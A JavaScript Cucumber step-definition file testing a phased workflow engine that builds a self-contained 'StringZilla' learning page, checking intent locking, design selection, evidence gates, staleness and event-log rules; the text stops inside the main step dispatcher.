import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";

import { Before, Given, setDefaultTimeout } from "@cucumber/cucumber";

import {
  COMMAND_TYPES,
  PHASES,
  PHASE_IDS,
  applyCommand,
  compileManifest,
  completePhase,
  createNativeFailureFixture,
  createRunState,
  evaluatePhaseGate,
  gateResultIsCurrent,
  patchIntentManifest,
  proposeDesignOptions,
  recordArtifact,
  recordEvidence,
  recordFinding,
  registerSource,
  releaseDecision,
  repairNativeFailureFixture,
  requestInput,
  resumeRunState,
  requiredIntentQuestions,
  selectDesign,
  stableStringify,
  startPhase,
  validateDesignOptions,
  validateEventLog,
  validatePortableArtifact,
} from "../../packages/workflow-engine/index.mjs";

setDefaultTimeout(30_000);

const FIXTURE_DIR = new URL("../fixtures/", import.meta.url);
const SKILL_FILE = new URL("../../skills/build-learning-booklet/SKILL.md", import.meta.url);
const SERVER_FILE = new URL("../../packages/mcp-server/server.mjs", import.meta.url);
const AT = "2026-07-22T12:00:00.000Z";
let runCounter = 0;

Before(function () {
  this.ctx = {};
});

async function fixture(name) {
  return JSON.parse(await readFile(new URL(name, FIXTURE_DIR), "utf8"));
}

function nextRunId(prefix = "bdd") {
  runCounter += 1;
  return `${prefix}-${runCounter}`;
}

function caught(operation) {
  try {
    operation();
    return null;
  } catch (error) {
    return error;
  }
}

function expectCode(error, code) {
  assert.ok(error, `Expected ${code}, but no error was thrown.`);
  assert.equal(error.name, "WorkflowError");
  assert.equal(error.code, code);
}

async function stringZillaRun({ mode = "plan_then_build", intentOverride, residualRisks, limitations } = {}) {
  const intent = await fixture("stringzilla-intent.json");
  return createRunState({
    runId: nextRunId(mode),
    mode,
    intent: intentOverride ?? intent.fields,
    permissions: { filesystem: false, shell: false, network: false },
    residualRisks,
    limitations,
    now: AT,
  });
}

function passCurrentGates(inputState, phaseId, { omit = [] } = {}) {
  let state = inputState;
  const phase = PHASES.find(({ id }) => id === phaseId);
  const artifact = state.artifacts[state.artifactIndex[phase.outputKind]];
  assert.ok(artifact, `${phaseId} requires its current ${phase.outputKind} artifact.`);
  for (const [index, gateId] of phase.gates.entries()) {
    if (omit.includes(gateId)) continue;
    const evidenceId = `bdd:${phaseId}:${index}:${state.eventCursor + 1}`;
    state = recordEvidence(
      state,
      {
        id: evidenceId,
        phaseId,
        gateId,
        status: "pass",
        executed: true,
        critical: true,
        artifactId: artifact.id,
        artifactHash: artifact.hash,
        details: { check: gateId, source: "golden-bdd" },
      },
      { now: AT },
    );
    state = evaluatePhaseGate(state, { phaseId, gateId, evidenceIds: [evidenceId] }, { now: AT });
  }
  return state;
}

async function readyI0({ mode = "plan_then_build", intentOverride } = {}) {
  const design = await fixture("stringzilla-design-options.json");
  let state = await stringZillaRun({ mode, intentOverride });
  state = startPhase(state, "I0", { now: AT });
  state = proposeDesignOptions(state, design.options, { now: AT });
  state = selectDesign(
    state,
    { method: "user-selected", selectedOptionId: "memory-lab" },
    { now: AT, selectedBy: "golden-user" },
  );
  state = recordArtifact(
    state,
    { id: `artifact-intent-${state.runId}`, kind: "intent", data: compileManifest(state) },
    { now: AT },
  );
  state = passCurrentGates(state, "I0");
  return completePhase(state, "I0", { now: AT });
}

async function preparePhase(inputState, phaseId, { complete = true, omitGates = [] } = {}) {
  const phase = PHASES.find(({ id }) => id === phaseId);
  let state = startPhase(inputState, phaseId, { now: AT });
  let artifact;
  if (phaseId === "P7") {
    artifact = await fixture("stringzilla-production-input.json");
    artifact = { ...artifact, id: `${artifact.id}-${state.runId}` };
  } else {
    artifact = {
      id: `artifact-${phase.outputKind}-${state.runId}`,
      kind: phase.outputKind,
      phaseId,
      data: { fixture: "StringZilla", phaseId, complete: true },
    };
  }
  state = recordArtifact(state, artifact, { now: AT });
  state = passCurrentGates(state, phaseId, { omit: omitGates });
  return complete ? completePhase(state, phaseId, { now: AT }) : state;
}

async function throughPhase(target, { mode = "plan_then_build" } = {}) {
  let state = await readyI0({ mode });
  const targetIndex = PHASE_IDS.indexOf(target);
  for (const phaseId of PHASE_IDS.slice(1, targetIndex + 1)) {
    state = await preparePhase(state, phaseId);
  }
  return state;
}

async function activePhaseWithArtifact(phaseId) {
  const prior = PHASE_IDS[PHASE_IDS.indexOf(phaseId) - 1];
  let state = prior ? await throughPhase(prior) : await stringZillaRun();
  state = startPhase(state, phaseId, { now: AT });
  const phase = PHASES.find(({ id }) => id === phaseId);
  const artifact = {
    id: `artifact-${phase.outputKind}-${state.runId}`,
    kind: phase.outputKind,
    phaseId,
    data: { fixture: "StringZilla", phaseId },
  };
  return recordArtifact(state, artifact, { now: AT });
}

function markNotRun(world, reason) {
  world.ctx.notRun = { status: "not_run", reason };
  return "pending";
}

function sanitizeAsText(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

Given("its phase IDs in order are:", function (dataTable) {
  assert.deepEqual(PHASE_IDS, dataTable.hashes().map(({ phase }) => phase));
});

// A strict dispatcher keeps the remaining Golden feature vocabulary closed: any
// new prose step fails until it receives a real assertion or explicit not_run boundary.
Given(/^(?!its phase IDs in order are:$)(.+)$/, async function (text) {
  const c = this.ctx;
  let match;

  // Artifact contract -------------------------------------------------------
  if (text === "the StringZilla production artifact") {
    c.artifact = await fixture("stringzilla-production-input.json");
    return;
  }
  if (text === "static portability is validated") {
    c.portability = validatePortableArtifact(c.artifact);
    return;
  }
  if (text === 'exactly one file named "index.html" exists') {
    assert.equal(c.artifact.files.length, 1);
    assert.equal(c.artifact.files[0].path, "index.html");
    return;
  }
  if (text === "it is self-contained") {
    assert.equal(c.artifact.metadata.selfContained, true);
    assert.equal(c.portability.valid, true);
    return;
  }
  if (text === "it needs no build step") {
    assert.equal(c.artifact.files.length, 1);
    assert.match(c.artifact.content, /^<!doctype html>/i);
    return;
  }
  if (text === "it has no required external runtime resource") {
    assert.deepEqual(c.artifact.metadata.externalRuntimeResources, []);
    assert.equal(c.portability.reasons.includes("external_runtime_resources_present"), false);
    return;
  }
  if ((match = text.match(/^index\.html links to "([^"]+)"$/))) {
    c.artifact = await fixture("stringzilla-production-input.json");
    assert.ok(c.artifact.content.includes(match[1]));
    c.citationUrl = match[1];
    return;
  }
  if (text === "the link is a learner-activated citation anchor") {
    assert.ok(c.artifact.metadata.externalLinks.includes(c.citationUrl));
    return;
  }
  if (text === "no script, style, font, image, import, or fetch depends on that URL") {
    assert.deepEqual(c.artifact.metadata.externalRuntimeResources, []);
    return;
  }
  if (text === "the external citation does not fail portability") {
    assert.equal(c.portability.valid, true, c.portability.reasons.join(", "));
    return;
  }
  if ((match = text.match(/^index\.html uses "([^"]+)" from "([^"]+)"$/))) {
    c.artifact = await fixture("stringzilla-production-input.json");
    c.artifact.metadata.externalRuntimeResources = [match[2]];
    c.artifact.content = c.artifact.content.replace(
      "</head>",
      `<script>/* required ${match[1]}: ${match[2]} */</script></head>`,
    );
    return;
  }
  if ((match = text.match(/^portability fails with "([^"]+)"$/))) {
    assert.equal(c.portability.valid, false);
    assert.ok(c.portability.reasons.includes(match[1]), JSON.stringify(c.portability));
    return;
  }
  if (text === 'production contains "index.html" and "lesson.js"') {
    c.artifact = await fixture("stringzilla-production-input.json");
    c.artifact.files.push({ path: "lesson.js", mimeType: "text/javascript" });
    return;
  }
  if (text === 'the golden index.html was opened from "file://"') {
    return markNotRun(this, "Requires an executed browser file:// reload with network interception.");
  }
  if ((match = text.match(/^the golden index\.html is opened at (\d+) CSS pixels$/))) {
    c.viewportWidth = Number(match[1]);
    return markNotRun(this, `Requires an executed browser viewport inspection at ${match[1]} CSS pixels.`);
  }
  if (
    [
      "all network requests are denied",
      "the page reloads",
      "initialization completes without an unexplained console error",
      "every core control still works",
      "no runtime request is attempted",
      "the complete page is inspected",
      "no horizontal page scroll obscures content or focus",
      "all controls remain reachable",
    ].includes(text)
  ) return;

  // Intent manifest ---------------------------------------------------------
  if ((match = text.match(/^a new "([^"]+)" run$/))) {
    c.state = createRunState({ runId: nextRunId("intent"), mode: match[1], now: AT });
    return;
  }
  if ((match = text.match(/^the user locked the learner as "([^"]+)"$/))) {
    c.state = patchIntentManifest(
      c.state,
      { learner: { value: match[1], origin: "user", locked: true, confidence: 1 } },
      { now: AT },
    );
    return;
  }
  if ((match = text.match(/^the user locked the excluded scope as "([^"]+)"$/))) {
    c.state = patchIntentManifest(
      c.state,
      { scope: { value: { include: [], exclude: [match[1]] }, origin: "user", locked: true } },
      { now: AT },
    );
    c.lockedScope = structuredClone(c.state.intent.fields.scope.value);
    return;
  }
  if ((match = text.match(/^a later phase proposes a default learner of "([^"]+)"$/))) {
    c.state = patchIntentManifest(c.state, { learner: match[1] }, { origin: "defaulted", now: AT });
    return;
  }
  if (text === "a source infers that installation should be included") {
    c.state = patchIntentManifest(
      c.state,
      { scope: { include: ["installation walkthrough"], exclude: [] } },
      { origin: "inferred", now: AT },
    );
    return;
  }
  if ((match = text.match(/^(?:the )?learner remains "([^"]+)"$/))) {
    assert.equal(c.state.intent.fields.learner.value, match[1]);
    return;
  }
  if ((match = text.match(/^"([^"]+)" remains excluded$/))) {
    assert.ok(c.state.intent.fields.scope.value.exclude.includes(match[1]));
    return;
  }
  if (text === "the rejected proposals do not replace either locked value") {
    assert.equal(c.state.intent.fields.learner.locked, true);
    assert.deepEqual(c.state.intent.fields.scope.value, c.lockedScope);
    return;
  }
  if (text === "topic, learner, depth, duration, and scope are authoritative") {
    c.state = await stringZillaRun();
    c.eventsBefore = c.state.events.length;
    return;
  }
  if (text === "the engine calculates required intent questions") {
    c.questions = requiredIntentQuestions(c.state);
    return;
  }
  if (text === "it returns no questions") {
    assert.deepEqual(c.questions, []);
    return;
  }
  if (text === "requesting an intent interrupt creates no event") {
    const next = requestInput(c.state, { type: "intent" }, { now: AT });
    assert.equal(next, c.state);
    assert.equal(next.events.length, c.eventsBefore);
    return;
  }
  if ((match = text.match(/^the user locked the duration as "([^"]+)"$/))) {
    c.state = patchIntentManifest(
      c.state,
      { duration: { value: match[1], origin: "user", locked: true, confidence: 1 } },
      { now: AT },
    );
    return;
  }
  if ((match = text.match(/^research infers a duration of "([^"]+)"$/))) {
    c.state = patchIntentManifest(c.state, { duration: match[1] }, { origin: "inferred", confidence: 0.7, now: AT });
    return;
  }
  if ((match = text.match(/^duration remains "([^"]+)"$/))) {
    assert.equal(c.state.intent.fields.duration.value, match[1]);
    return;
  }
  if (text === "a critical open conflict records the existing and incoming values") {
    const conflict = c.state.intent.conflicts.find(({ field, status }) => field === "duration" && status === "open");
    assert.ok(conflict);
    assert.equal(conflict.severity, "critical");
    assert.equal(conflict.existing.value, "35 minutes");
    assert.equal(conflict.incoming.value, "2 hours");
    return;
  }
  if (text === "I0 cannot pass until the user resolves the conflict") {
    c.state = startPhase(c.state, "I0", { now: AT });
    c.error = caught(() => completePhase(c.state, "I0", { now: AT }));
    expectCode(c.error, "PHASE_GATE_BLOCKED");
    return;
  }
  if ((match = text.match(/^the user changes duration to "([^"]+)"$/))) {
    c.state = patchIntentManifest(
      c.state,
      { duration: { value: match[1], origin: "user", locked: true, confidence: 1 } },
      { now: AT },
    );
    return;
  }
  if ((match = text.match(/^duration is "([^"]+)"$/))) {
    assert.equal(c.state.intent.fields.duration.value, match[1]);
    return;
  }
  if (text === 'its origin is "user"') {
    assert.equal(c.state.intent.fields.duration.origin, "user");
    return;
  }
  if (text === "it remains locked") {
    assert.equal(c.state.intent.fields.duration.locked, true);
    return;
  }
  if ((match = text.match(/^required field "([^"]+)" exists only as an unlocked inference$/))) {
    const intent = await fixture("stringzilla-intent.json");
    intent.fields[match[1]] = { ...intent.fields[match[1]], origin: "inferred", locked: false };
    c.state = await stringZillaRun({ intentOverride: intent.fields });
    const design = await fixture("stringzilla-design-options.json");
    c.state = startPhase(c.state, "I0", { now: AT });
    c.state = proposeDesignOptions(c.state, design.options, { now: AT });
    c.state = selectDesign(c.state, { method: "user-selected", selectedOptionId: "memory-lab" }, { now: AT });
    c.state = recordArtifact(c.state, { id: `intent-${c.state.runId}`, kind: "intent", data: compileManifest(c.state) }, { now: AT });
    c.state = passCurrentGates(c.state, "I0");
    return;
  }
  if (text === "I0 completion is attempted") {
    c.error = caught(() => completePhase(c.state, "I0", { now: AT }));
    return;
  }
  if ((match = text.match(/^completion fails with "([^"]+)"$/))) {
    expectCode(c.error, match[1]);
    return;
  }

  // Design selection --------------------------------------------------------
  if (text === "the authoritative StringZilla intent fixture") {
    c.state = await stringZillaRun();
    return;
  }
  if (text === "I0 is active") {
    c.state = startPhase(c.state, "I0", { now: AT });
    return;
  }
  if (text === "the StringZilla design options are proposed") {
    c.designFixture = await fixture("stringzilla-design-options.json");
    c.state = proposeDesignOptions(c.state, c.designFixture.options, { now: AT });
    return;
  }
  if (text === "exactly 3 options are accepted") {
    assert.equal(c.state.design.options.length, 3);
    assert.equal(validateDesignOptions(c.state.design.options).valid, true);
    return;
  }
  if (text === "their identifiers, names, and visual directions are pairwise distinct") {
    const options = c.state.design.options;
    assert.equal(new Set(options.map(({ id }) => id)).size, 3);
    assert.equal(new Set(options.map(({ name }) => name)).size, 3);
    assert.equal(new Set(options.map(({ visualDirection }) => stableStringify(visualDirection))).size, 3);
    return;
  }
  if (text === "exactly 1 option is recommended") {
    assert.equal(c.state.design.options.filter(({ recommended }) => recommended).length, 1);
    return;
  }
  if (text === "the recommendation remains nonbinding") {
    assert.equal(c.state.design.selection, null);
    return;
  }
  if ((match = text.match(/^design options have "([^"]+)"$/))) {
    const fixtureData = await fixture("stringzilla-design-options.json");
    const options = structuredClone(fixtureData.options);
    switch (match[1]) {
      case "two options": options.pop(); break;
      case "four options": options.push({ ...options[2], id: "fourth", name: "Fourth", visualDirection: { thesis: "four" } }); break;
      case "duplicate identifiers": options[1].id = options[0].id; break;
      case "duplicate visual directions": options[1].visualDirection = structuredClone(options[0].visualDirection); break;
      case "no recommendation": options.forEach((option) => { option.recommended = false; }); break;
      case "multiple recommendations": options[1].recommended = true; break;
      default: assert.fail(`Unknown design defect: ${match[1]}`);
    }
    c.designEventsBefore = c.state.events.filter(({ type }) => type === "design.options.proposed").length;
    c.error = caught(() => proposeDesignOptions(c.state, options, { now: AT }));
    return;
  }
  if ((match = text.match(/^proposal fails with "([^"]+)"$/))) {
    expectCode(c.error, match[1]);
    return;
  }
  if (text === "no design option event is appended") {
    assert.equal(c.state.events.filter(({ type }) => type === "design.options.proposed").length, c.designEventsBefore);
    return;
  }
  if (text === "the three valid StringZilla options") {
    const design = await fixture("stringzilla-design-options.json");
    c.state = proposeDesignOptions(c.state, design.options, { now: AT });
    return;
  }
  if ((match = text.match(/^option "([^"]+)" is selected twice with command ID "([^"]+)"$/))) {
    const command = {
      type: "design.select",
      payload: { selection: { method: "user-selected", selectedOptionId: match[1] }, selectedBy: "golden-user" },
      idempotencyKey: match[2],
      expectedStateVersion: c.state.stateVersion,
    };
    c.versionBeforeSelection = c.state.stateVersion;
    const first = applyCommand(c.state, command, { now: AT });
    const second = applyCommand(first.state, command, { now: AT });
    c.firstSelection = first;
    c.secondSelection = second;
    c.state = second.state;
    return;
  }
  if (text === "one design selected event exists") {
    assert.equal(c.state.events.filter(({ type }) => type === "design.selected").length, 1);
    return;
  }
  if (text === "the state version advances only once") {
    assert.equal(c.firstSelection.events.length, 1);
    assert.equal(c.secondSelection.events.length, 0);
    assert.equal(c.state.stateVersion, c.versionBeforeSelection + 1);
    return;
  }
  if ((match = text.match(/^the final visual direction is "([^"]+)"$/))) {
    assert.equal(c.state.design.selection.selectedOptionId, match[1]);
    return;
  }
  if ((match = text.match(/^the user selects "([^"]+)"$/))) {
    c.state = selectDesign(c.state, { method: "user-selected", selectedOptionId: match[1] }, { now: AT });
    c.manifest = compileManifest(c.state);
    return;
  }
  if (text === "the compiled manifest contains the final Memory Lab direction") {
    assert.equal(c.manifest.design.selection.selectedOptionId, "memory-lab");
    assert.equal(c.manifest.design.finalVisualDirection.thesis, "Inspect the bytes, then reason about the cost.");
    return;
  }
  if (text === "it contains neither the option catalogue nor rejected option payloads") {
    assert.equal(Object.hasOwn(c.manifest.design, "options"), false);
    assert.equal(Object.hasOwn(c.manifest.design, "rejectedOptionIds"), false);
    const serialized = JSON.stringify(c.manifest);
    assert.equal(serialized.includes("search-map"), false);
    assert.equal(serialized.includes("benchmark-dossier"), false);
    return;
  }
  if ((match = text.match(/^the user hybridizes "([^"]+)" and "([^"]+)" with a concrete direction$/))) {
    c.hybridDirection = {
      thesis: "Inspect bytes while challenging every benchmark conclusion.",
      layout: "responsive evidence workbench",
      accessibility: "keyboard complete with non-color evidence cues",
    };
    c.state = selectDesign(
      c.state,
      { method: "user-hybridized", sourceOptionIds: [match[1], match[2]], finalVisualDirection: c.hybridDirection },
      { now: AT },
    );
    return;
  }
  if (text === "both source option IDs are recorded") {
    assert.deepEqual(c.state.design.selection.sourceOptionIds, ["memory-lab", "benchmark-dossier"]);
    return;
  }
  if (text === "the concrete hybrid becomes the only downstream visual direction") {
    assert.deepEqual(compileManifest(c.state).design.finalVisualDirection, c.hybridDirection);
    assert.equal(Object.hasOwn(compileManifest(c.state).design, "options"), false);
    return;
  }
  if ((match = text.match(/^I0 passed with "([^"]+)" selected$/))) {
    c.state = await readyI0();
    assert.equal(c.state.design.selection.selectedOptionId, match[1]);
    return;
  }
  if (text === "P5 begins") {
    for (const phaseId of ["P0", "P1", "P2", "P3", "P4"]) c.state = await preparePhase(c.state, phaseId);
    c.state = startPhase(c.state, "P5", { now: AT });
    c.operationalRules = { responsive: true, keyboard: true, nonColorCues: true };
    const design = await fixture("stringzilla-design-options.json");
    c.error = caught(() => proposeDesignOptions(c.state, design.options, { now: AT }));
    return;
  }
  if (text === 'another three-option proposal fails with "DESIGN_PHASE_CLOSED"') {
    expectCode(c.error, "DESIGN_PHASE_CLOSED");
    return;
  }
  if (text === "P5 must translate Memory Lab into concrete responsive and accessible rules") {
    assert.equal(c.state.design.selection.selectedOptionId, "memory-lab");
    assert.deepEqual(c.operationalRules, { responsive: true, keyboard: true, nonColorCues: true });
    return;
  }

  // Evidence and gates ------------------------------------------------------
  if (text === "a current P8 verification artifact") {
    c.state = await activePhaseWithArtifact("P8");
    return;
  }
  if ((match = text.match(/^gate "([^"]+)" has "([^"]+)" evidence$/))) {
    c.phaseId = "P8";
    c.gateId = match[1];
    c.evidenceIds = [];
    if (match[2] !== "missing") {
      const artifact = c.state.artifacts[c.state.artifactIndex.verification];
      const id = `evidence-${match[2]}-${c.state.runId}`;
      c.state = recordEvidence(
        c.state,
        {
          id,
          phaseId: "P8",
          gateId: match[1],
          status: match[2],
          executed: match[2] === "not_run" ? false : true,
          critical: true,
          artifactId: artifact.id,
          artifactHash: artifact.hash,
        },
        { now: AT },
      );
      c.evidenceIds = [id];
    }
    return;
  }
  if (text === "that gate is evaluated") {
    c.state = evaluatePhaseGate(c.state, { phaseId: c.phaseId, gateId: c.gateId, evidenceIds: c.evidenceIds }, { now: AT });
    return;
  }
  if ((match = text.match(/^its result is "([^"]+)"$/))) {
    assert.equal(c.state.gateResults[`${c.phaseId}:${c.gateId}`].status, match[1]);
    return;
  }
  if (text === "P8 cannot complete") {
    expectCode(caught(() => completePhase(c.state, "P8", { now: AT })), "PHASE_GATE_BLOCKED");
    return;
  }
  if (text === "a current artifact") {
    c.state = await throughPhase("P0");
    c.currentArtifact = c.state.artifacts[c.state.artifactIndex.charter];
    return;
  }
  if (text === "pass evidence declares executed false") {
    c.error = caught(() => recordEvidence(c.state, {
      id: `false-pass-${c.state.runId}`,
      phaseId: "P0",
      gateId: "charter.scope_feasible",
      status: "pass",
      executed: false,
      artifactId: c.currentArtifact.id,
      artifactHash: c.currentArtifact.hash,
    }, { now: AT }));
    return;
  }
  if ((match = text.match(/^evidence recording fails with "([^"]+)"$/))) {
    expectCode(c.error, match[1]);
    return;
  }
  if (text === "passing evidence binds to the current P7 artifact hash") {
    c.state = await throughPhase("P7");
    c.boundEvidence = Object.values(c.state.evidence).find(({ phaseId }) => phaseId === "P7");
    c.oldP7Hash = c.boundEvidence.artifactHash;
    return;
  }
  if (text === "the P7 artifact content changes") {
    const production = await fixture("stringzilla-production-input.json");
    production.id = `${production.id}-changed-${c.state.runId}`;
    production.content = production.content.replace("Memory Lab", "Memory Lab revised");
    c.state = recordArtifact(c.state, production, { now: AT });
    return;
  }
  if (text === "that evidence is stale") {
    assert.equal(c.state.evidence[c.boundEvidence.id].stale, true);
    return;
  }
  if (text === "every gate using it is stale") {
    const result = c.state.gateResults[`P7:${c.boundEvidence.gateId}`];
    assert.equal(result.stale, true);
    assert.equal(gateResultIsCurrent(c.state, "P7", c.boundEvidence.gateId), false);
    return;
  }
  if (text === "release fails until affected checks rerun against the new hash") {
    const decision = releaseDecision(c.state, { evaluatedAt: AT });
    assert.equal(decision.decision, "fail");
    assert.notEqual(c.oldP7Hash, c.state.artifacts[c.state.artifactIndex.production].hash);
    return;
  }
  if (text === "P1 through P9 passed with current artifacts and evidence") {
    c.state = await throughPhase("P9");
    c.preChangeArtifactIds = Object.fromEntries(
      PHASE_IDS.slice(PHASE_IDS.indexOf("P1"), PHASE_IDS.indexOf("P9") + 1).map((phaseId) => {
        const kind = PHASES.find(({ id }) => id === phaseId).outputKind;
        return [phaseId, c.state.artifactIndex[kind]];
      }),
    );
    return;
  }
  if (text === "the P1 research artifact changes") {
    c.state = recordArtifact(c.state, {
      id: `artifact-research-revised-${c.state.runId}`,
      kind: "research",
      data: { correction: "benchmark scope qualified", revision: 2 },
    }, { now: AT });
    return;
  }
  if (text === "P1 through P9 artifacts affected by that dependency are stale") {
    for (const phaseId of PHASE_IDS.slice(PHASE_IDS.indexOf("P1"), PHASE_IDS.indexOf("P9") + 1)) {
      assert.equal(c.state.artifacts[c.preChangeArtifactIds[phaseId]].stale, true, `${phaseId} artifact was not stale`);
    }
    return;
  }
  if (text === "P1 through P9 evidence affected by that dependency is stale") {
    for (const entry of Object.values(c.state.evidence).filter(({ phaseId }) => /^P[1-9]$/.test(phaseId))) {
      assert.equal(entry.stale, true, `${entry.id} was not stale`);
    }
    return;
  }
  if (text === "the earliest responsible phase is reopened") {
    assert.equal(c.state.phases.P1.status, "stale");
    assert.equal(c.state.status, "active");
    return;
  }
  if (text === "P10 cannot pass") {
    c.error = caught(() => startPhase(c.state, "P10", { now: AT }));
    assert.ok(["UPSTREAM_PHASE_INCOMPLETE", "PHASE_ALREADY_ACTIVE"].includes(c.error?.code));
    return;
  }
  if (text === "two states contain the same normalized evidence in different insertion orders") {
    c.stateA = await activePhaseWithArtifact("P10");
    c.stateA = passCurrentGates(c.stateA, "P10");
    c.stateB = structuredClone(c.stateA);
    c.stateB.evidence = Object.fromEntries(Object.entries(c.stateB.evidence).reverse());
    return;
  }
  if (text === "release decisions are calculated at the same time") {
    c.decisionA = releaseDecision(c.stateA, { evaluatedAt: AT });
    c.decisionB = releaseDecision(c.stateB, { evaluatedAt: AT });
    return;
  }
  if (text === "their normalized decisions are equal") {
    assert.equal(stableStringify(c.decisionA), stableStringify(c.decisionB));
    return;
  }
  if ((match = text.match(/^evidence status is "([^"]+)"$/))) {
    c.state = await stringZillaRun();
    c.error = caught(() => recordEvidence(c.state, {
      id: "invalid-evidence",
      phaseId: "I0",
      gateId: "intent.no_critical_conflicts",
      status: match[1],
    }, { now: AT }));
    return;
  }

  // Phase orchestration -----------------------------------------------------
  if (text === "a new workflow run") {
    c.state = createRunState({ runId: nextRunId("phase"), now: AT });
    return;
  }
  if ((match = text.match(/^starting phase "([^"]+)" fails with "([^"]+)"$/))) {
    expectCode(caught(() => startPhase(c.state, match[1], { now: AT })), match[2]);
    return;
  }
  if (text === "P1 is active with its current research artifact") {
    c.state = await activePhaseWithArtifact("P1");
    return;
  }
  if ((match = text.match(/^gate "([^"]+)" evaluated to fail$/))) {
    const artifact = c.state.artifacts[c.state.artifactIndex.research];
    const evidenceId = `failed-${match[1]}-${c.state.runId}`;
    c.state = recordEvidence(c.state, {
      id: evidenceId,
      phaseId: "P1",
      gateId: match[1],
      status: "fail",
      executed: true,
      artifactId: artifact.id,
      artifactHash: artifact.hash,
    }, { now: AT });
    c.state = evaluatePhaseGate(c.state, { phaseId: "P1", gateId: match[1], evidenceIds: [evidenceId] }, { now: AT });
    return;
  }
  if (text === "P1 completion is attempted") {
    c.error = caught(() => completePhase(c.state, "P1", { now: AT }));
    return;
  }
  if (text === "P2 cannot start") {
    c.startP2Error = caught(() => startPhase(c.state, "P2", { now: AT }));
    assert.ok(
      ["UPSTREAM_PHASE_INCOMPLETE", "PHASE_ALREADY_ACTIVE"].includes(c.startP2Error?.code),
      c.startP2Error?.code,
    );
    return;
  }
  if (text === "the run does not claim to be planned or completed") {
    assert.equal(["planned", "completed"].includes(c.state.status), false);
    assert.equal(c.state.events.some(({ type }) => ["run.planned", "run.completed"].includes(type)), false);
    return;
  }
  if (text === "accepted commands changed a run several times") {
    c.state = await stringZillaRun();
    for (let index = 0; index < 4; index += 1) {
      c.state = applyCommand(c.state, {
        type: "intent.patch",
        payload: { patch: { [`extra_${index}`]: { value: index, origin: "user", locked: true } } },
        expectedStateVersion: c.state.stateVersion,
      }, { now: AT }).state;
    }
    return;
  }
  if (text === "the event log is validated") {
    c.logValidation = validateEventLog(c.state);
    return;
  }
  if (text === "every sequence is the preceding sequence plus 1") {
    assert.equal(c.logValidation.valid, true, c.logValidation.errors.join("; "));
    c.state.events.forEach((event, index) => assert.equal(event.seq, index + 1));
    return;
  }
  if (text === "every event state version is monotonic and gap free") {
    c.state.events.forEach((event, index) => assert.equal(event.stateVersion, index + 1));
    return;
  }
  if (text === "eventCursor and stateVersion equal the final event sequence") {
    const final = c.state.events.at(-1).seq;
    assert.equal(c.state.eventCursor, final);
    assert.equal(c.state.stateVersion, final);
    return;
  }
  if ((match = text.match(/^a run in "([^"]+)" mode$/))) {
    c.mode = match[1];
    return;
  }
  if (text === "every in-scope phase receives current passing evidence") {
    const terminal = c.mode === "manifest_only" ? "I0" : c.mode === "plan_only" ? "P6" : "P10";
    c.state = await throughPhase(terminal, { mode: c.mode });
    return;
  }
  if ((match = text.match(/^the run status is "([^"]+)"$/))) {
    assert.equal(c.state.status, match[1]);
    return;
  }
  if ((match = text.match(/^its terminal reason is "([^"]+)"$/))) {
    assert.equal(c.state.terminalReason, match[1]);
    return;
  }
  if ((match = text.match(/^phase "([^"]+)" cannot start$/))) {
    const error = caught(() => startPhase(c.state, match[1], { now: AT }));
    assert.ok(error);
    assert.ok(["UNKNOWN_PHASE", "PHASE_OUTSIDE_MODE", "PHASE_ALREADY_ACTIVE"].includes(error.code), error.code);
    return;
  }
  if (text === 'a "plan_only" run passed I0 through P6') {
    c.state = await throughPhase("P6", { mode: "plan_only" });
    return;
  }
  if (text === 'the run ends as "planned"') {
    assert.equal(c.state.status, "planned");
    return;
  }
  if (text === "no production artifact exists") {
    assert.equal(c.state.artifactIndex.production, undefined);
    return;
  }
  if (text === "no verification or release evidence exists") {
    assert.equal(Object.values(c.state.evidence).some(({ phaseId }) => ["P8", "P10"].includes(phaseId)), false);
    return;
  }
  if (text === "no event claims the run completed") {
    assert.equal(c.state.events.some(({ type }) => type === "run.completed"), false);
    return;
  }
  if ((match = text.match(/^the current state version is (\d+)$/))) {
    c.state = createRunState({ runId: nextRunId("version"), now: AT });
    while (c.state.stateVersion < Number(match[1])) {
      const index = c.state.stateVersion;
      c.state = patchIntentManifest(
        c.state,
        { [`version_pad_${index}`]: { value: index, origin: "user", locked: true } },
        { now: AT },
      );
    }
    c.beforeObsoleteCommand = structuredClone(c.state);
    return;
  }
  if ((match = text.match(/^a command expects state version (\d+)$/))) {
    c.error = caught(() => applyCommand(c.state, {
      type: "phase.start",
      payload: { phaseId: "I0" },
      expectedStateVersion: Number(match[1]),
    }, { now: AT }));
    return;
  }
  if ((match = text.match(/^it fails with "([^"]+)"$/))) {
    expectCode(c.error, match[1]);
    return;
  }
  if (text === "the run state is unchanged") {
    assert.deepEqual(c.state, c.beforeObsoleteCommand);
    return;
  }
  if (text === "the packaged native fixture has produced its design interrupt") {
    c.nativeFixture = createNativeFailureFixture({
      threadId: nextRunId("native-thread"),
      parentRunId: nextRunId("native-parent"),
      runId: nextRunId("native-child"),
      now: AT,
    });
    c.interrupted = c.nativeFixture.interruptedState;
    return;
  }
  if ((match = text.match(/^the producing run ends with outcome "([^"]+)"$/))) {
    assert.equal(c.interrupted.terminalOutcome, match[1]);
    assert.equal(c.interrupted.executionStatus, match[1]);
    return;
  }
  if (text === "its last event is terminal run.finished") {
    assert.equal(c.interrupted.events.at(-1).type, "run.finished");
    assert.equal(c.interrupted.events.at(-1).payload.outcome, "interrupt");
    assert.equal(c.interrupted.events.at(-1).payload.finalRevision, c.interrupted.stateVersion);
    return;
  }
  if (text === "the fixture applies the complete resume set") {
    c.resumed = c.nativeFixture.state;
    assert.equal(c.resumed.pendingDecision, null);
    return;
  }
  if (text === "the child keeps the same thread with a new run ID and parentRunId") {
    assert.equal(c.resumed.threadId, c.interrupted.threadId);
    assert.notEqual(c.resumed.runId, c.interrupted.runId);
    assert.equal(c.resumed.parentRunId, c.interrupted.runId);
    return;
  }
  if (text === "RUN_STARTED input contains the complete resume set") {
    assert.deepEqual(c.resumed.events[0].payload.resume, c.resumed.resume);
    assert.deepEqual(c.resumed.resume.map(({ interruptId }) => interruptId), [c.nativeFixture.interruptId]);
    return;
  }
  if ((match = text.match(/^an incomplete resume set fails with "([^"]+)"$/))) {
    const error = caught(() => resumeRunState(c.interrupted, {
      runId: nextRunId("incomplete-child"),
      resume: [],
      now: AT,
    }));
    expectCode(error, match[1]);
    return;
  }
